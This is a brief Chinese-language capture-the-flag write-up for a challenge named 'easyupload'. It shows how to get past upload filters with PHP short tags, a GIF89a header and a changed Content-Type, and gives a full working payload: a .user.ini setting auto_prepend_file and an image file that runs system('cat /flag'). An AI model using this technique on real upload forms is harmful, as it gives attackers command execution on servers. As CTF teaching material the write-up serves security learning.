# easyupload

考点：利用fastcgi的.user.ini特性进行任意命令执行

这里需要绕过的点如下

- 检查文件内容是否有php字符串
- 检查后缀中是否有htaccess或ph
- 检查文件头部信息
- 文件[MIME](https://www.runoob.com/http/mime-types.html)类型

对于第一点可以利用短标签绕过，php依然能够执行。例如`<?=phpinfo();?>`

对于第二点可以通过上传.user.ini以及正常jpg文件来进行getshell

在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。
这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。
其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。

第三点绕过方式即在文件头部添加一个图片的文件头，比如`GIF89a`

第四点绕过方法即修改上传时的Content-Type

因此最终的payload为：
上传.user.ini，内容为

```
GIF89a                  
auto_prepend_file=a.jpg
```

上传a.jpg，内容为

```
GIF89a
<?=system('cat /flag');?>
```

[浅析.user.ini的利用](https://blog.csdn.net/cosmoslin/article/details/120793126)